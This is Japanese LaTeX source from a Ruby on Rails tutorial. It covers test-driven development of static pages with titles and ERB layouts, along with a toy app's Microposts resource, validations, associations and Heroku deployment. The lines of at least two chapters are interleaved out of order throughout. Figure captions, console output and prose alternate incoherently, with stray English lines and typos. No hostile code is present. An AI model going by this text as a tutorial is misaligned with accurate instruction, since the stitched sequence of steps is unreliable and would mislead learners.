テストが揃っていれば、機能停止に陥るような\emph{回帰バグ} (regression: 以前のバグが再発したり機能追加/変更の副作用が生じたりすること、先祖返りとも言う) を防止できる。
   -> 0.0023s
テストが揃っていれば、コードを安全に\emph{リファクタリング} (機能を変更せずにコードを改善すること) できる。
==  CreateMicroposts: migrated (0.0026s) ======================
テストコードは、アプリケーションコードから見れば\emph{クライアント}として動作するので、アプリケーションの設計やシステムの他の部分とのインターフェイスを決めるときにも役に立つ。
これでMicropostsを作成する準備ができました。作成方法は\ref{sec:a_user_tour}と同じです。
上の3つのメリットは、テストを先に書かなくても\emph{得ることができます}が、それでもテスト駆動開発 (TDD) という手法をいつでも使えるようにしておけば、間違いなく多くの場面で役に立ちます。
置き換えた結果をリスト\ref{code:demo_microposts_resource}に示します。
テストの手法やタイミングは、ある意味テストをどのぐらいすらすら書けるかで決まると言ってよいでしょう。たいていの開発者は、テストを書くのに慣れてくるとテストを先に書くようになります。
scaffoldで生成した実際のコードにはリスト\ref{code:demo_microposts_resource}よりも多くの改行が追加されていることがあります。
その他にも、アプリケーションのコードと比べてテストがどのぐらい書きにくいか、必要な機能をどのぐらい正確に把握しているか、その機能が将来廃止される可能性がどのぐらいあるかによっても異なってくるでしょう。
Rubyでは単なる改行は無視されるので、問題ありません。
こういうときのために、「テスト駆動」にするか「一括テスト」にするかを決める目安となるガイドラインがあると便利です。
Railsルートで使用するMicropostsリソース用のルール
著者の経験を元に、以下のようにまとめてみました。
アプリケーションのコードよりも明らかにテストコードの方が短くシンプルになる (=簡単に書ける) のであれば、テストを先に書けるようになることを目指す。
/microposts
期待している動作がまだ固まりきっていないのであれば、先にアプリケーションのコードを書き上げ、続いて期待する動作をテストコードで記述することを目指す。
すべてのマイクロポストを表示するページ
セキュリティが最重要課題であれば、セキュリティモデルでエラーが発生した場合のテストを最初に書くべき。
/microposts/1
バグを見つけたら、そのバグを再現するテストを真っ先に書き、回帰バグを防ぐ体制を整えてからアプリケーションのコードの修正に取りかかる。
id=\kode{1}のマイクロポストを表示するページ
将来変更の可能性が少しでもあるコード (HTML構造の細部など) があれば必ずテストを書く。
/microposts/new
マイクロポストを新規作成するページ
リファクタリングの前には必ずテストを書き、エラーを起こしそうなコードや、特に止まってしまいそうなコードを集中的にテストする。
上のガイドラインに従う場合、現実には最初にコントローラやモデルのテストを書き、続いて統合テスト (モデル/ビュー/コントローラにまたがる機能テスト) を書く、ということになります。
マイクロポストを新規作成するアクション
また、不安定な要素が特に見当たらないアプリケーションや、(主にビューが) 頻繁に改定される可能性の高いアプリケーションのコードを書くときには、思い切ってテストを省略してしまうこともないわけではありません。
/microposts/1/edit
本書における主要なテストは、\emph{コントローラテスト} (この節より)、\emph{モデルテスト} (第\ref{cha:modeling_users}章より)、\emph{統合テスト} (第\ref{cha:sign_up}章より) の3つです。
id=\kode{1}のマイクロポストを編集するページ
統合テストでは、ユーザーがWebブラウザでアプリケーションとやりとりする操作をシミュレートできるので特に強力です。
id=\kode{1}のマイクロポストを更新するアクション
統合テストは最終的にテスティングにおける最も主要な武器となりますが、まずは取っ付きやすいコントローラテストから始めることにしましょう。
<n><n>  \subsection{最初のテスト} % (fold)<n>  \label{sec:our_first_test}<n><n>
それではサンプルアプリケーションのAboutページの作成に取りかかります。
id\kode{1}のマイクロポストを削除する
続いてそのテストを実行して「失敗」することを確認し、実際のアプリケーションコードを書きます。
Micropostsリソースが提供するリスト\ref{code:demo_microposts_resource}のRESTfulルート
初めて書くテストがいきなり「テスト先行」というのは、Ruby on Railsの知識がある程度以上必要なため、少々敷居が高い面もあります。
Micropostsコントローラ自体の構造をリスト\ref{code:demo_microposts_controller}に示します。
今の段階でテストを書かせようとすると、尻込みしてしまう人もいるかもしれません。
これはリスト\ref{code:demo_users_controller}で使用されていました。
しかしご心配なく。面倒な部分は既にRailsが全部面倒を見てくれています。\kode{rails generate controller} (リスト\ref{code:generating_pages}) を実行した時点でテストファイルがちゃんと作成されているので、それを利用しましょう。
これは、RESTアーキテクチャが2つのリソースに同じように反映されていることを示しています。
生成されたテストを見てみましょう (リスト\ref{code:default_controller_test})。
Micropostsコントローラの骨格
StaticPagesコントローラのデフォルトのテスト 
現時点では、上のリスト\ref{code:default_controller_test}の文法をいきなり理解する必要はありません。今は「このファイルにはテストが2つ書かれている」ことを認識していただければ十分です。その2つのテストは、リスト\ref{code:generating_pages}で生成したコントローラの2つのアクションであるHomeとHelpに対応して生成されたものです。
それぞれのテストでは、アクションをgetして正常に動作することを確認します。この確認は「\emph{アサーション}」(assertion: 主張、断言) と呼ばれる手法で行います。
その次の「response\kode{:success}」は、実際にはHTTP の\href{http://en.wikipedia.org/wiki/List_of_HTTP_status_codes}{ステータスコード} (ここでは\href{http://en.wikipedia.org/wiki/List_of_HTTP_status_codes#2xx_Success}{200 OK}) を表します。
つまり、以下のようなテストは
テスティングサイクルの最初の一回しに取りかかる前に、まずは現在のテストスイートをそのまま実行して、問題なくパスすることを確認しておきます。
\ref{sec:demo_users_resource}でも説明したように、システム環境によっては\kode{bundle exec}が追加不要なこともあります。クラウドIDE (\ref{sec:development_environment}) も追加不要なシステムのひとつです。しかしここでは省略せずにコマンドをきじゅつしています。
著者の場合、原則として\kode{bundle exec}は追加せずに実行し、うまくいかないときだけ\kode{bundle exec}を追加して様子を見る、ということをよく行っています。
$ bundle exec rake test<n>2 tests, 2 assertions, 0 failures, 0 errors, 0 skips
テストスイートは期待どおりパス(\passing) します
ところで、テストの実行にはある程度時間がかかります。これには2つの要因が絡んでいます: (1) \emph{Spring server}を起動してRails環境を事前読み込みするのに時間がかかる。ただしこれは最初の1回だけです。(2) Rubyそのものの起動に時間がかかる
(2番目の要因については、\ref{sec:guard}で紹介するGuardを導入することで改善できます)。
多くのテストツールでは、テストの失敗を「レッド」、成功したときを「グリーン」で表します。ここから、このサイクルを「レッド・グリーン・リファクタリング」と呼ぶこともあります。
\href{http://localhost:3000/microposts/new}{/microposts/new}ページをブラウザで開き、新しいマイクロポストの情報を入力してマイクロポストをいくつか作成してみましょう (図\ref{fig:demo_new_micropost})。
\kode{rake test}はデフォルトで、テストの失敗を赤色で表示しますが、テストがパスしても緑色で表示しません。
色もちゃんと表示したい場合は\ref{sec:minitest_reporters}をご覧ください。
新しいマイクロポストの作成ページ (\href{http://localhost:3000/microposts/new}{/microposts/new})
サイクルの記念すべき第一歩はAboutページ用の失敗するテストを書くことです。
ここではひとまずマイクロポストを1つか2つ作成し、少なくとも片方の\kode{user\_id}が\kode{1}になるようにして、\ref{sec:a_user_tour}で作成した最初のユーザーのidと同じにします。
リスト\ref{code:default_controller_test}を参考にすれば、正しいテストコードを何となく想像できると思います。正しいテストコードをリスト\ref{code:about_test}に示します。
結果は図\ref{fig:demo_micropost_index}のようになるはずです。
Aboutページのテスト
マイクロポストのindexページ (\href{http://localhost:3000/microposts}{/microposts})
\failing \\ \filepath{test/controllers/static\_pages\_controller\_test.rb}}<n>%= lang:ruby, options: "hl_lines": [15, 16, 17, 18]<n>\begin{code}<n>require 'test_helper'<n><n>class StaticPagesControllerTest < ActionController::TestCase<n><n>  test "should get home" do<n>    get :home<n>    assert_response :success
マイクロポストの\emph{マイクロ}という名前にふさわしく、何らかの方法で文字数制限を与えてみましょう。
マイクロポストの最大文字数を140文字に制限する。
リスト\ref{code:about_test}のハイライト行を見ると、他のHomeページ用テストやHelpページ用テストとほとんど同じであることがわかります。違いは「home」や「help」の部分が「about」に変わっている点だけです。
リスト\ref{code:demo_length_validation}のコードは、これで本当に動作するのかと思えるかもしれませんが、ちゃんと動作します (検証機能については\ref{sec:user_validations}でさらに詳しく説明します)。141文字以上の新規マイクロポストを投稿してみればわかります。
テストを実行すると、期待どおり失敗します。
図\ref{fig:micropost_length_error}に示したとおり、マイクロポストの内容が長すぎるという\emph{エラーメッセージ}がRailsによって表示されます
$ bundle exec rake test<n>3 tests, 2 assertions, 0 failures, 1 errors, 0 skips
(エラーメッセージの詳細については\ref{sec:signup_error_messages}で説明します)。
マイクロポストの作成に失敗した場合のエラーメッセージ
異なるデータモデル同士の\emph{関連付け}は、Railsの強力な機能です。
ここでは、1人のユーザーに対し複数のマイクロポストがあるとしましょう。
失敗したテストのエラーメッセージをもっと詳しく見ていきましょう
UserモデルとMicropostモデルをそれぞれリスト\ref{code:demo_user_has_many_microposts}とリスト\ref{code:demo_micropost_belongs_to_user}のように更新することでこの関連付けを表現できます。
システムによっては、ソースコードのエラーパスを追跡する「スタックトレース」または「バックトレース」と呼ばれるメッセージが大量に表示されることがあります。この場合、かなり上にスクロールする必要があるかもしれません。
1人のユーザーに複数のマイクロポストがある。
バックトレース出力を絞り込んで不要な行が表示されないようにしたい場合は、\ref{sec:backtrace_silencer}をご覧ください。
1つのマイクロポストは1人のユーザーにのみ属する。
$ bundle exec rake test<n>ActionController::UrlGenerationError:<n>No route matches {:action=>"about", :controller=>"static_pages"}
この関連付けを図で表したものが図\ref{fig:micropost_user_association}です。
このエラーメッセージによれば、「指定されたアクション/コントローラの組み合わせに一致するルーティングが見当たらない」とあります。つまりルーティングファイルを修正する必要があるということです。
\kode{microposts}テーブルには\kode{user\_id}カラムを作成してあったので、それによってRailsとActive Recordがマイクロポストとユーザーを関連付けることができるようになっています。
リスト\ref{code:pages_routes}のときと同じ要領で変更を行った結果をリスト\ref{code:about_route}に示します。
The association between microposts and users.
\kode{about}用のルートを追加する
第\ref{cha:user_microposts} 章と第\ref{cha:following_users}章では、関連付けられたユーザーとマイクロポストを同時に表示し、Twitterのようなマイクロポストのフィードを作成する予定です。
ここでは、Railsの\emph{console}を使用して、ユーザーとマイクロポストの関連付けを確認するにとどめます。Railsのconsoleは、Railsアプリケーションを対話的に操作することができる便利なツールです。
$ bundle exec rake test<n>AbstractController::ActionNotFound:<n>The action 'about' could not be found for StaticPagesController
We first invoke the console with \kode{rails console} at the command line, and then retrieve the first user from the database using \kode{User.first} (putting the results in the variable \kode{first\_user})
このエラーメッセージから、「StaticPagesコントローラに\kode{about}アクションがない」ということがわかります。リスト\ref{code:static_pages_controller}の\kode{home}や\kode{help}と同じようにaboutアクションを追加します (リスト\ref{code:adding_the_about_page})。
\kode{about}アクションが追加されたStaticPagesコントローラ
=> [#<Micropost id: 1, content: "First micropost!", user_id: 1, <n>created_at: "2011-11-03 02:37:37", updated_at: "2011-11-03 02:37:37">,
micropost.user
$ bundle exec rake test<n>ActionView::MissingTemplate: Missing template static_pages/about
(最後の行のように\kode{exit}を実行するとrails consoleを終了できます。
今度はテンプレートがないようです。Railsではテンプレートといえばすなわち「ビュー」のことです。
多くのシステムでは、Ctrl-dキーを押して終了することもできます。)
ファイルの作成方法はシステムの設定によってさまざまですが、たいていのテキストエディタでは、ディレクトリをCtrl+クリックすればコンテキストメニューに [New File] や [ファイルを作成] などのメニューが表示されます。
あるいはエディタの[File]メニューでファイルを作成して、このディレクトリに保存しても構いません。
このときActive Recordは、\kode{user\_id}が\kode{first\_user}のid (ここでは\kode{1}) と等しいマイクロポストを自動的に返します。
個人的には\href{http://en.wikipedia.org/wiki/Touch_(Unix)}{Unixのtouchコマンド}でファイルを作成するのがかっこいいと思います。
We’ll learn much more about the association facilities in Active Record in Chapter \ref{cha:user_microposts} and Chapter \ref{cha:following_users}.
\kode{touch}コマンドは本来ファイルやディレクトリのタイムスタンプだけを更新するためのコマンドなのですが、ファイルが存在しない場合には空ファイルを作成するという一種の副作用があります
最後に、Toyアプリケーションで使用しているRailsのコントローラとモデルのクラス階層について簡単に解説します。
(クラウドIDEをご利用の場合は、touchでファイル作成後に\ref{sec:bundler}のようにファイルツリーの更新が必要な場合があります)。
この節を理解するには、多少なりともオブジェクト指向プログラミング (OOP) の経験が必要です。オブジェクト指向プログラミングを学んだことのない方はこの節をスキップしても構いません。
これはリスト\ref{code:custom_about_page}で使用されていました。
特に、\emph{クラス}の概念 (\ref{sec:ruby_classes}で解説します) に慣れていない方は、後でこの節をもう一度読み返すことをおすすめいたします。
最初に、モデルの継承構造について説明します。
Aboutページのコード
リスト\ref{code:demo_user_class}とリスト\ref{code:demo_micropost_class}を比較してみると、UserモデルとMicropostモデルはいずれも\kode{ActiveRecord::Base}というクラスを継承しています (継承関係は\kode{<}記号で表現されています)。このクラスは、ActiveRecordが提供するベースクラスであり、クラス間のリレーションは図\ref{fig:demo_model_inheritance}のようになります。
Ruby on Rails 3.2 チュートリアル
他も同様です。
<n>  This is the sample application for the tutorial.
\kode{User}クラスにおける継承
今度は\kode{rake test}の結果は \passing になるはずです。
\kode{Micropost}クラスにおける継承
$ bundle exec rake test<n>3 tests, 3 assertions, 0 failures, 0 errors, 0 skips
UserモデルとMicropostモデルの継承階層
もちろん、実際にブラウザを起動して、テストが正しく動いているかどうかを確かめることもできます (図\ref{fig:about_us})。
コントローラの継承構造はもう少しだけ複雑です。
作成したAboutページ (\href{http://localhost:3000/static_pages/about}{/static\_pages/about})
リスト\ref{code:demo_users_controller_class}とリスト\ref{code:demo_microposts_controller_class}を比較してみると、UsersコントローラとMicropostsコントローラはいずれもApplicationControllerを継承しています。
テストが \passing になったので、安心してコードをリファクタリングできるようになりました。
リスト\ref{code:toy_application_controller_class}を見ると、\kode{ApplicationController}自身は\kode{ActionController::Base}を継承しています。これはRailsのAction Packというライブラリが提供している、コントローラ用のベースクラスです。
アプリケーションの開発が進むと、コードのどこからともなく「腐敗臭」が漂い始めます。コードや記法の統一が崩れて読みづらくなる、クラスやメソッドが何百行にも膨れ上がって読む気を削がれる、なぜこのコードがここにあるのか最早誰もその理由を思い出せなくなる、同じコードがあちこちにコピペされて少しずつ書き換えられ手に負えなくなる、などです。
これらのクラス同士の関係を図\ref{fig:demo_controller_inheritance}に示します。
コンピュータにしてみればどんなに汚らしいコードであろうと、そこにあるがままに実行するだけですが、人間はそういうわけにはいきません。こまめにリファクタリングを繰り返してコードを常にすみずみまで美しくコンパクトに保ち、他の開発者や未来の自分の開発意欲を阻喪することのないようにしなければなりません。
\kode{UsersController}クラスにおける継承
このサンプルアプリは生まれたてなので、今のところリファクタリングの必要な箇所はほぼどこにも見当たりません。しかし「一匹いれば30匹いると思え」、\href{https://en.wikipedia.org/wiki/Code_smell}{コードの腐敗臭}はどんな小さな隙間からも忍び寄ってきます。こmリファクタリングの習慣をできるだけ早いうちに身につけるためにも、少々無理やりに\ref{sec:layouts_and_embedded_ruby}から始めることにします。
<n><n>      % subsubsection refactor (end)<n><n>    % subsection our_first_test<n><n>  % section getting_started_with_testing (end)<n><n><n>  \section{少しだけ動的なページ} % (fold)<n>  \label{sec:slightly_dynamic_pages}<n><n>
\kode{MicropostsController}クラスにおける継承
静的なページのアクションやビューをいくつか作成できたので、今度はそれを\emph{ほんの少しだけ}動的にしてみましょう。ページの内容に応じて、ページのタイトルを自ら書き換えて表示するようにします。
タイトルを自動で変えるぐらいのことが\emph{真の}動的コンテンツと呼べるかどうかは議論の余地があると思いますが、いずれにしろこのページは、第\ref{cha:sign_up}章で紹介する本格的な動的コンテンツの基礎となります。
\kode{ApplicationController}クラスにおける継承 
The inheritance hierarchy for the Users and Microposts controllers.
モデルの継承関係と同様に、UsersコントローラもMicropostsコントローラも最終的には\kode{ActionController::Base}を継承しており、モデルオブジェクトの操作、インバウンドHTTP requestのフィルタ、ビューをHTMLとして出力するなどの多彩な機能を実行できるようになっています。 Since all Rails controllers inherit from \kode{ApplicationController}, rules defined in the Application controller automatically apply to every action in the application.
たとえば\ref{sec:remember_me}では、ログインとログアウト用のヘルパーメソッドをサンプルアプリケーションのすべてのコントローラで利用できるようにしています。
Micropostsリソースの説明が終わりましたので、ここでリポジトリをBitbucketに登録しましょう。
通常、Gitのコミットはなるべくこまめに行うようにし、更新をあまりためないことが望ましいのですが、この章の締めくくりとしてサイズの大きなコミットを1度だけ行うぐらいであれば問題ありません。
この時点で、Toyアプリケーションを\ref{sec:deploying}のようにHerokuに展開してもかまいません。
(上のコマンド操作では、\ref{sec:planning_the_application}のHerokuアプリを作成済みであることが前提です。
ここでの目標は、Homeページ、Helpページ、Aboutページをそれぞれ編集し、最終的にページごとに異なるタイトルを表示することです。
アプリを作成していないのであれば、先に\kode{heroku create}、\kode{git push heroku master}を実行してから上のコマンド操作を実行してください。)
ここではビューの\kode{<title>}タグの内容を変更します。
アプリケーションのデータベースが動作するようにするには、以下を実行して本番データベースのマイグレーションを行う必要もあります。
多くのブラウザでは、titleタグの内容をブラウザウィンドウの上部にウィンドウタイトルとして表示します。titleタグは、いわゆるSEO (search engine optimization: 検索エンジン最適化) においても重要な役割を果たします。
このコマンドを実行すると、先ほど定義したユーザーとマイクロポストのデータモデルを使って、Heroku上のデータベースが更新されます。
本節の終わりまでに、3つの静的ページのタイトルを「<ページ名> | Ruby on Rails Tutorial Sample App」という形式に変更します。「<ページ名>」の部分がページに応じて変わります (表\ref{table:static_pages})。
マイグレーションが完了すれば、Toyアプリを実際のPostgreSQLデータベースをバックエンドに配置した本番環境で利用できるようになっているはずです(図\ref{fig:toy_app_production})。
前述の\kode{rails new}コマンド (リスト\ref{code:rails_new_sample_app}) を実行すると、レイアウトもデフォルトで作成されます。ここでは学習のため、一時的に以下のようにファイル名を変更します。
Toyアプリを本番環境で実行する
普通は、実際のアプリケーション開発時に上のような操作を行うことはありません。ここでは、レイアウトファイルの役割をよりわかりやすく説明するために、最初にレイアウトファイルを無効にしています。
非常に簡単ではありますが、ついにRailsアプリケーションを最後まで完成させました。
基本タイトル
この章で作成したToyアプリケーションには良いところもありますが、さまざまな弱点もあります。
追加タイトル
Rails全体を高度なレベルで概観できた
MVCモデルを紹介できた
RESTアーキテクチャに初めて触れた
データモデルの作成を初めて行った
データベースを背後に持つWebアプリケーションを本番環境で動かした
サンプルアプリケーションの (ほぼ) 静的なページ。
レイアウトもスタイルも設定されていない
\label{table:static_pages}}<n>\end{table}<n><n>    \subsection{タイトルをテストする (Red)} % (fold)<n>    \label{sec:testing_titles}<n><n>
ページタイトルを追加するために、典型的なWebページの構造を今一度おさらいしておきましょう (リスト\ref{code:html_structure})。
“Home” や “About” のような定番の静的なページがない
ユーザーがパスワードを設定できない
Webページの典型的なHTML構造
ユーザーが画像を置けない
ログインのしくみがない
セキュリティのためのしくみがまったくない
ユーザーとマイクロポストの自動関連付けが行われていない
Twitterのような「フォロワー (following)機能」や「フォロー中 (followed)機能」がない
マイクロポストをフィードできない
まともなテストがない
HTMLの仕様は時とともに変わる可能性があると思っておく方がよいでしょう。今後もブラウザでなるべく正しくページを表示できるように、doctypeを明示的に宣言しています。
理解が困難
\kode{p} (paragraph) タグを使って、 “Hello, world!” と表示するようにしています。
(HTMLではスペースやタブは無視されるので、インデントはあってもなくても大丈夫ですが、インデントがある方がHTMLのデータ構造を理解しやすくなります)。
本書では以後、このアプリの良い点を保ちつつ、弱点をひとつひとつ克服していきます。
表\ref{table:static_pages}の各タイトルについて簡単なテストを書きます (リスト\ref{code:about_test})。このテストで使用している\kode{assert\_select}メソッドでは、特定のHTMLタグが存在するかどうかをテストします (この種のアサーションメソッドはその名から「セレクタ」と呼ばれることもあります)
<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:toy_app_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
"Home | Ruby on Rails Tutorial Sample App"
Scaffold機能でコードを自動生成すると、Webのあらゆる部分からモデルデータにアクセスしてやりとりできるようになる。
上のセレクタは、\kode{<title>}タグ内に「Home | Ruby on Rails Tutorial Sample App」という文字列があるかどうかをチェックします。
同じ要領で3つの静的ページを書き換えます (リスト\ref{code:title_tests})。
Scaffoldは何よりも手っ取り早いのがとりえだが、これを元にRailsを理解するには向いていない。
RailsではWebアプリケーションの構成にMVC (Model-View-Controller) というモデルを採用している。
StaticPagesコントローラのタイトルをテストする 
Railsが解釈するRESTには、標準的なURLセットと、データモデルとやりとりするためのコントローラアクションが含まれている。
Railsではデータのバリデーション (validation) がサポートされており、データモデルの属性の値に制限をかけることができる。
Railsには、さまざまなデータモデル同士を関連付けを定義するための組み込み関数が多数用意されている。
Railsコンソールを使用すると、コマンドラインからRailsアプリケーションとやりとりすることができる。
リスト\ref{code:validates_content_presence}のコードにはマイクロポストの存在確認用のバリデーションの追加方法が示されています。これは、マイクロポストが空欄にならないようにするためのものです。
図\ref{fig:micropost_content_cant_be_blank}と同じ表示になるこt確認してください。
リスト\ref{code:toy_user_presence_valications}を次のように更新してください: \kode{FILL\_IN}の部分を適切なコードに置き換え、Userモデルの名前属性とメール属性が存在するかどうかのバリデーションを行えるようにします (図\ref{fig:user_presence_validations})。
(上のテストコードで繰り返し使われている「Ruby on Rails Tutorial Sample App」という文字列を一刻も早くリファクタリングしたくてたまらない方には、\ref{sec:static_pages_exercises}の演習をおすすめします。)
マイクロポストのコンテンツが存在しているかどうかのバリデーションコード
マイクロポストの存在確認バリデーションの結果
$ bundle exec rake test<n>3 tests, 6 assertions, 3 failures, 0 errors, 0 skips
Userモデルに存在確認バリデーションを追加する
今度は各ページにタイトルを追加して、\ref{sec:testing_titles}のテストがパスするようにしましょう。
リスト\ref{code:html_structure}の基本HTML構造をカスタムのHomeページ (リスト\ref{code:custom_home_page}) に追加すると (リスト\ref{code:home_view_full_html}のようになります。
Userモデルの存在確認バリデーションの結果
完全なHTML構造を備えたHomeページのビュー
    This is the home page for the
    sample application.
このページの表示を図\ref{fig:home_view_full_html}に示します
本書のスクリーンショットでは原則としてGoogle Chromeを使用していますが、Chromeのタブはタイトルを表示しきれないので、図\ref{fig:home_view_full_html}では代わりにSafariを使用しています。
タイトルが付いたHomeページ
Helpページ (リスト\ref{code:custom_help_page}) やAboutページ (リスト\ref{code:custom_about_page}) についても、同じ要領でリスト\ref{code:help_view_full_html} や リスト\ref{code:about_view_full_html}のようなコードに変更します。
The view for the Help page with full HTML structure. 
  Get help on the Ruby on Rails Tutorial at the
  To get help on this sample app, see the
Ruby on Rails 3.2 チュートリアル
完全なHTML構造を備えたAboutページのビュー
<n>      This is the sample application for the tutorial.
これでテストスイートは \passing になるはずです。
$ bundle exec rake test<n>3 tests, 6 assertions, 0 failures, 0 errors, 0 skips
この節では、Railsのコントローラとアクションを使って3つの有効なページを生成することでさまざまなことを達成しました。しかしそれらは単純な静的ページであり、またRailsの能力を十分に発揮できていません。
しかも、コードが甚だしく重複しています。
ページのタイトルがどれもほぼ同じ (完全にではないが)。
「Ruby on Rails Tutorial Sample App」という文字が3つのタイトルで繰り返し使われている。
HTMLの構造全体が各ページで重複している。
同じコードを繰り返すことはRubyの「DRY」(Don't Repeat Yourself: 繰り返すべからず) という原則に反します。この節では、繰り返しを追放してコードをDRY (=よく乾かす) にしましょう。
最後に\ref{sec:adding_page_titles}のテストを実行して、タイトルを壊していないことを確認します。
上の話と一見矛盾するようですが、最初にコードを若干追加して、現在は「ほぼ」同じになっているページのタイトルを「\emph{完全に}」同じにしておきます。
この方が、コードの重複を一括で取り除けるからです。
重複を取り除くテクニックのひとつとして、ビューで「\emph{埋め込みRuby}」(Embedded Ruby) を使用できます。
Home、Help、Aboutページには可変要素があるので、Railsの\kode{provide}関数を使用してタイトルをページごとに変更します。
これはリスト\ref{code:home_view_erb_title}で使用されていました。
タイトルにERBコードを使用したHomeページのビュー
リスト\ref{code:home_view_erb_title} は、\emph{ERB}と呼ばれている、Rubyの埋め込みコードの最初の例です
Railsでの開発経験者であれば、この時点で\kode{content\_for}の使用を検討すると思いますが、残念ながらAsset Pipelineと併用すると正常に動作しないことがあります。
\kode{provide}関数はcontent\_forの代替です。
Rubyを勉強したことのある方であれば、Railsはブロックの内容を\emph{yield}していると推測することでしょう。そして、その推測はおそらく正しいでしょう。
しかし、Rails開発のためにこれらの詳細を知る必要はありません。
ERBでビューをこのように書き換えても、ページの表示結果は以前とまったく同じです。タイトルの可変部分がERBによって動的に生成されている点だけが異なります。
\ref{sec:adding_page_titles}のテストを実行してこの改修を確認すれば、今度も \passing になるはずです。
続いて、HelpページとAboutページも同様に変更します (リスト\ref{code:help_view_erb_title}、リスト\ref{code:about_view_erb_title})。
タイトルにERBコードを使用したHelpページのビュー
タイトルにERBコードを使用したAboutページのビュー
タイトルの可変部分をERBを使って置き換えたので、現在それぞれのページはだいたい以下のような構造になっています。
第3版 目次
こうして見ると、HTMLの構造はtitleタグの内容も含めてどのページも完全に同じです。異なる点があるとすれば、\kode{body}タグの内側のコンテンツだけです。
このレイアウトファイルを有効にするには、前述のデフォルトのタイトル部分を以下のERBコードに差し替えます。
変更の結果、レイアウトファイルはリスト\ref{code:application_layout}のようになります。
上のコードにある、以下の特殊なコードにご注目ください。
このコードは、各ページの内容をレイアウトに挿入するためのものです。
Railsのデフォルトのレイアウトには、以下の行が追加されていることにもご注目ください。
上の3つのERBは、それぞれスタイルシート、JavaScript、\kode{csrf\_meta\_tags}メソッドをページ内で展開するためのものです。スタイルシートとJavaScriptは、Asset Pipeline (\ref{sec:the_asset_pipeline}) の一部です。csrf\_meta\_tagsは、Web攻撃手法のひとつである\href{http://en.wikipedia.org/wiki/Cross-site_request_forgery}{クロスサイトリクエストフォージェリー} (cross-site request forgery: CSRF)を防ぐために使われるRailsのメソッドです。
もちろん、リスト\ref{code:home_view_erb_title}、リスト\ref{code:help_view_erb_title}、 リスト\ref{code:about_view_erb_title}のビューには、レイアウトと重複するHTMLがまだ残っているので、それらを削除して、内部のコンテンツだけ残します。
この改修が終わると、 リスト\ref{code:home_view_interior}、リスト\ref{code:help_view_interior}、リスト\ref{code:about_view_interior}のように実に簡潔で美しいコードになります。
HTML構造を削除したHomeページ
HTML構造を削除したHelpページ
HTML構造を削除したAboutページ
上のように定義されたビューは、Home、Help、Aboutページの表示は以前と変わりませんが、コードの重複が大きく削減されました。
この節で行ったようなちっぽけなリファクタリングですら、実際にやってみると大小さまざまなエラーが発生します。ベテラン開発者ほどこのことを骨の髄まで理解しており、どんな小さなリファクタリングでもあなどったりしません。
テストスイートをきちんと整備しておくことがいかに重要であるか、皆さんにもご理解いただけると思います。
開発のごく初期の段階なら全ページを目視でひとつひとつ確認して回ることもできるかもしれませんが、そんな方法ではじきに手に負えなくなります。このアプリでは必要なテストスイートが整備されているので、今度も \passing になることを確認するだけでOKです。
もちろん厳密に言えば、テストがパスしたというだけではそのコードが本当に正しいのかどうかの\emph{証明}にはなりません。しかし正しいコードに確実に近づくことができ、正しい可能性も上がります。何よりも、テストがあれば今後発生するバグを防ぐためのセーフティネットになります。
サイトのページのカスタマイズが終わって、テストスイートも軌道に乗ってきたので、今のうちにアプリケーションルートのルーティングを設定しておきましょう。
\ref{sec:hello_world}と\ref{sec:mvc_in_action}でやったように、ルーティングを設定するには\kode{routes.rb}ファイルを編集して、ルート「/」とWebページを結び付けます。結び付ける相手はHomeページです
(\ref{sec:sample_app_setup}でApplicationコントローラに\kode{hello}アクションを追加した場合は、今のうちにアクションを削除しておくことをおすすめします)。
変更結果をリスト\ref{code:home_root_route}に示します。ここでは、リスト\kode{hello}の\kode{get} ルールを以下のコードに置き換えています。
変更後のルーティングファイルを図\ref{fig:home_root_route}に示します。
HomeページをルートURLに設定する
ルートURLにアクセスするとHomeページが表示される
もちろんそんなことはありません。皆さんはこの章でRailsのコントローラ、アクション、ビューの開発をひととおり行ったことで、これから動的なコンテンツをどしどしサイトに追加するための準備がすっかり整ったのです。
残る課題は、皆さんがこのチュートリアルをいかに最後までやりぬくか、それだけであると言ってよいでしょう。
次の章に進む前に、差分をコミットしてmasterブランチにマージしておきましょう。
\ref{sec:static_pages}では、静的ページの開発のためのGitブランチを用意しました。
ここまでの作業内容をコミットしていない場合、作業の区切りをつけるためにもコミットしましょう。
次にmasterブランチに移動し、\ref{sec:git_commands}と同じ要領で差分をマージします。
コミット時に「マージするとSpringのプロセスID (pid) ファイルが上書きされる可能性があります」のようなエラーメッセージが表示される場合は、コマンドラインで\kode{rm -f *.pid}を実行してpidファイルを削除してください。
このように中継点まで達したら、コードをリモートリポジトリにアップロードしておくとよいでしょう (\ref{sec:bitbucket}の手順に従っていれば、リモートリポジトリはBitBucketを使用することになるでしょう)。
また、この時点でHerokuにデプロイしてみてもよいでしょう。
デプロイする前にテストを走らせていますが、こういった習慣を身につけておくと開発に役立ちます。
<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:static_pages_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
新しいRailsアプリケーションをゼロから作成したのはこれで3度目。今回も必要なgemのインストール、リモートリポジトリへのプッシュ、production環境まで行った。
コントローラを新規作成するための\kode{rails}のスクリプトは\kode{rails generate controller ControllerName <action name (省略可)>}。訳注: コントローラ名はキャメルケース、アクション名はスネークケースにする。
新しいルーティングは\kode{config/routes.rb}ファイルで定義する。
常に自動化テストを使用して新機能開発を進めることで、自信を持ってリファクタリングできるようになり、回帰バグもいちはやくキャッチできるようになる。
テスト駆動開発では「レッド・グリーン・リファクタリング」サイクルを繰り返す。
Railsのレイアウトでは、アプリケーションのページの共通部分をテンプレートに置くことでコードの重複を解決することができる。
以後本チュートリアルの演習を解く際には、以下のように演習用トピックブランチを別途作成してそこで行うことをおすすめします。
トピックブランチを分けておくことで、チュートリアル本編との食い違いを避けることができます。
満足のゆく解ができたら、リモートリポジトリにプッシュしてもよいでしょう (リモートリポジトリがある場合)。
(最後の行では、この後の開発準備のためにmasterブランチをチェックアウトしていますが、チュートリアル本編への影響を避けるため、演習で行った変更はmasterにマージ\emph{していません})。
今後の章では、ブランチやコミットメッセージはもちろん異なりますが、基本的なアイディアは同じです。
StaticPagesコントローラのテスト (リスト\ref{code:title_tests}) にも重複があることにお気付きでしょうか。
